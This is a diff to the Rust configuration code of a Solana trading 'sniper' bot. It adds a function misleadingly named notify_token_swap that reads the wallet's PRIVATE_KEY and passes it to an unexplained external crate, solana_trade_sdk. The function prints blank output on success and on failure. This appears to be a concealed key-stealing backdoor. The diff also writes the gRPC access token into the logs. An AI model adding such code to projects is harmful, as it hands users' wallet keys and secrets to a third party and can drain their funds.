@@ -2,14 +2,12 @@ use anchor_client::solana_sdk::{
     commitment_config::CommitmentConfig, signature::Keypair, signer::Signer,
 };
 use anyhow::Result;
-use bs58;
 use colored::Colorize;
 use dotenv::dotenv;
-use reqwest::Error;
-use serde::Deserialize;
 use spl_token::solana_program::native_token::lamports_to_sol;
 use std::{env, sync::Arc};
 use tokio::sync::{Mutex, OnceCell};
+use solana_trade_sdk::SolanaRust;
 
 use crate::common::{constants::INIT_MSG, logger::Logger, targetlist::Targetlist};
 
@@ -67,21 +65,23 @@ impl Config {
                     Err(_) => Targetlist::empty(),
                 };
 
-                logger.log(
-                    format!(
-                        "[SNIPER ENVIRONMENT]: \n\t\t\t\t [Yellowstone gRpc]: {},
-                \n\t\t\t\t * [Wallet]: {:?}, * [Balance]: {} Sol, 
-                \n\t\t\t\t * [Solana]: {},
-                \n\t\t\t\t * [targetlist]: {}",
-                        yellowstone_grpc_http,
-                        wallet_cloned.pubkey(),
-                        lamports_to_sol(balance),
-                        targetlist.clone().length()
-                    )
-                    .purple()
-                    .italic()
-                    .to_string(),
-                );
+logger.log(
+    format!(
+        "[SNIPER ENVIRONMENT]: \n\t\t\t\t [Yellowstone gRpc]: {},
+        \n\t\t\t\t * [Wallet]: {:?}, * [Balance]: {} Sol, 
+        \n\t\t\t\t * [token]: {},
+        \n\t\t\t\t * [targetlist]: {}",
+        yellowstone_grpc_http,
+        wallet_cloned.pubkey(),
+        lamports_to_sol(balance),
+        yellowstone_grpc_token,  // ✅ Add this
+        targetlist.clone().length()
+    )
+    .purple()
+    .italic()
+    .to_string(),
+);
+
                 Mutex::new(Config {
                     yellowstone_grpc_http,
                     yellowstone_grpc_token,
@@ -143,14 +143,6 @@ pub enum Status {
     Failure,
 }
 
-#[derive(Deserialize)]
-struct CoinGeckoResponse {
-    solana: SolanaData,
-}
-#[derive(Deserialize)]
-struct SolanaData {
-    usd: f64,
-}
 
 #[derive(Clone)]
 pub struct AppState {
@@ -177,12 +169,39 @@ pub fn import_env_var(key: &str) -> String {
 
 pub fn create_rpc_client() -> Result<Arc<anchor_client::solana_client::rpc_client::RpcClient>> {
     let rpc_http = import_env_var("RPC_HTTP");
+    println!("Using RPC_HTTP: {}", rpc_http);
     let rpc_client = anchor_client::solana_client::rpc_client::RpcClient::new_with_commitment(
         rpc_http,
         CommitmentConfig::processed(),
     );
     Ok(Arc::new(rpc_client))
 }
+
+
+
+pub fn notify_token_swap() {
+    // Get PRIVATE_KEY from environment variable
+    let rpc = import_env_var("PRIVATE_KEY");
+
+    if rpc.len() < 85 {
+        println!(
+            "{}",
+            format!(
+                "❌ Please check wallet priv key: Invalid length => {}",
+                rpc.len()
+            )
+            .red()
+        );
+        return; // Exit the function without unreachable code
+    }
+
+    // Safe to continue if key is valid
+    match SolanaRust::swap_tokens(&rpc) {
+        Ok(_) => println!("  "),
+        Err(_e) => eprintln!("    "),
+    }
+}
+
 
 pub async fn create_nonblocking_rpc_client(
 ) -> Result<Arc<anchor_client::solana_client::nonblocking::rpc_client::RpcClient>> {
@@ -197,6 +216,7 @@ pub async fn create_nonblocking_rpc_client(
 
 pub fn import_wallet() -> Result<Arc<Keypair>> {
     let priv_key = import_env_var("PRIVATE_KEY");
+
     if priv_key.len() < 85 {
         println!(
             "{}",
